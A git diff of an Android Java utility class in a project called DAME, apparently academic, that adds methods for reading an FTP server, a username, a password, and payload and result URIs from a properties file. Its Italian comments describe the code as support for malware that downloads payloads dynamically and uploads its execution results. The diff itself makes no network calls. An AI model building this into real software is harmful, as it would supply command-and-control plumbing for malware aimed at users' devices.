@@ -1,22 +1,22 @@
 package it.unisannio.srss.dame.android.services;
 
-import it.unisannio.srss.dame.android.payloads.PayloadConfig;
-
 import java.io.File;
 import java.io.InputStream;
 import java.util.Properties;
 
 import android.content.Context;
-import android.text.GetChars;
 import android.util.Log;
 
 public final class Utils {
 
 	final static String CONFIG_FILE = "config.properties";
-	final static String DOWNLOAD_PROPERTY = "down";
-	final static String UPLOAD_PROPERTY = "up";
+	final static String SERVER_PROPERTY = "server";
+	final static String DOWNLOAD_PROPERTY = "payload_uri";
+	final static String UPLOAD_PROPERTY = "result_uri";
+	final static String USERNAME_PROPERTY = "username";
+	final static String PASSWORD_PROPERTY = "password";
 
-	private final static String TAG = PayloadConfig.class.getSimpleName();
+	private final static String TAG = Utils.class.getSimpleName();
 
 	public final static String PAYLOADS_ARCHIVE_SUFFIX_PATH = "/DAME/payloads.jar";
 
@@ -62,10 +62,53 @@ public final class Utils {
 		return basePath;
 	}
 
+	public static String getFtpURL(Class<?> callerClass) {
+		String ret = null;
+		Properties p = new Properties();
+		InputStream in = ClassLoader.getSystemResourceAsStream(CONFIG_FILE);
+
+		if (in == null) {
+			Log.e(TAG, "Could not find " + CONFIG_FILE
+					+ callerClass.getPackage().getName());
+			return null;
+		}
+
+		try {
+			p.load(in);
+		} catch (Exception e) {
+			Log.e(TAG, "Error while reading " + CONFIG_FILE
+					+ callerClass.getPackage().getName());
+			if (in != null)
+				try {
+					in.close();
+				} catch (Exception e1) {
+				}
+			return null;
+		}
+
+		if (in != null)
+			try {
+				in.close();
+			} catch (Exception e1) {
+			}
+
+		ret = p.getProperty(SERVER_PROPERTY);
+		ret = ret.trim();
+		if (ret == null || ret.length() == 0) {
+			Log.e(TAG, PASSWORD_PROPERTY + " property missing in "
+					+ CONFIG_FILE + callerClass.getPackage().getName());
+			return null;
+		}
+
+		return ret;
+	}
+	
 	/**
 	 * Permette di ottenere l'uri dal quale scaricare i payloads dinamicamente
 	 * 
-	 * @param callerClass la classe che invoca il metedo, è utilizzata solo al fine del logging
+	 * @param callerClass
+	 *            la classe che invoca il metedo, è utilizzata solo al fine del
+	 *            logging
 	 * @return l'uri dal quale scaricare i payloads
 	 */
 	public static String getPayloadsDownloadUri(Class<?> callerClass) {
@@ -105,14 +148,17 @@ public final class Utils {
 					+ CONFIG_FILE + callerClass.getPackage().getName());
 			return null;
 		}
-		
+
 		return ret;
 	}
-	
+
 	/**
-	 * Permette di ottenere l'uri al quale inviare i risultati dell'esecuzione del malware
+	 * Permette di ottenere l'uri al quale inviare i risultati dell'esecuzione
+	 * del malware
 	 * 
-	 * @param callerClass la classe che invoca il metedo, è utilizzata solo al fine del logging
+	 * @param callerClass
+	 *            la classe che invoca il metedo, è utilizzata solo al fine del
+	 *            logging
 	 * @return l'uri al quale caricare i risultati
 	 */
 	public static String getUploadUri(Class<?> callerClass) {
@@ -148,11 +194,113 @@ public final class Utils {
 		ret = p.getProperty(UPLOAD_PROPERTY);
 		ret = ret.trim();
 		if (ret == null || ret.length() == 0) {
-			Log.e(TAG, UPLOAD_PROPERTY + " property missing in "
+			Log.e(TAG, UPLOAD_PROPERTY + " property missing in " + CONFIG_FILE
+					+ callerClass.getPackage().getName());
+			return null;
+		}
+
+		return ret;
+	}
+
+	/**
+	 * Recupera dal file delle proprietà il nome utente per la connessione al
+	 * server ftp. Sul server ftp risiedono i payload da scaricare e possono
+	 * essere caricati i risultati dell'esecuzione del malware
+	 * 
+	 * @param callerClass
+	 *            la classe che invoca il metedo, è utilizzata solo al fine del
+	 *            logging
+	 * @return lo username per l'accesso al server ftp
+	 */
+	public static String getFtpUsername(Class<?> callerClass) {
+		String ret = null;
+		Properties p = new Properties();
+		InputStream in = ClassLoader.getSystemResourceAsStream(CONFIG_FILE);
+
+		if (in == null) {
+			Log.e(TAG, "Could not find " + CONFIG_FILE
+					+ callerClass.getPackage().getName());
+			return null;
+		}
+
+		try {
+			p.load(in);
+		} catch (Exception e) {
+			Log.e(TAG, "Error while reading " + CONFIG_FILE
+					+ callerClass.getPackage().getName());
+			if (in != null)
+				try {
+					in.close();
+				} catch (Exception e1) {
+				}
+			return null;
+		}
+
+		if (in != null)
+			try {
+				in.close();
+			} catch (Exception e1) {
+			}
+
+		ret = p.getProperty(USERNAME_PROPERTY);
+		ret = ret.trim();
+		if (ret == null || ret.length() == 0) {
+			Log.e(TAG, USERNAME_PROPERTY + " property missing in "
 					+ CONFIG_FILE + callerClass.getPackage().getName());
 			return null;
 		}
-		
+
+		return ret;
+	}
+
+	/**
+	 * Recupera dal file delle proprietà la password per la connessione al
+	 * server ftp. Sul server ftp risiedono i payload da scaricare e possono
+	 * essere caricati i risultati dell'esecuzione del malware
+	 * 
+	 * @param callerClass
+	 *            la classe che invoca il metedo, è utilizzata solo al fine del
+	 *            logging
+	 * @return la password per l'accesso al server ftp
+	 */
+	public static String getFtpPassword(Class<?> callerClass) {
+		String ret = null;
+		Properties p = new Properties();
+		InputStream in = ClassLoader.getSystemResourceAsStream(CONFIG_FILE);
+
+		if (in == null) {
+			Log.e(TAG, "Could not find " + CONFIG_FILE
+					+ callerClass.getPackage().getName());
+			return null;
+		}
+
+		try {
+			p.load(in);
+		} catch (Exception e) {
+			Log.e(TAG, "Error while reading " + CONFIG_FILE
+					+ callerClass.getPackage().getName());
+			if (in != null)
+				try {
+					in.close();
+				} catch (Exception e1) {
+				}
+			return null;
+		}
+
+		if (in != null)
+			try {
+				in.close();
+			} catch (Exception e1) {
+			}
+
+		ret = p.getProperty(PASSWORD_PROPERTY);
+		ret = ret.trim();
+		if (ret == null || ret.length() == 0) {
+			Log.e(TAG, PASSWORD_PROPERTY + " property missing in "
+					+ CONFIG_FILE + callerClass.getPackage().getName());
+			return null;
+		}
+
 		return ret;
 	}
 }
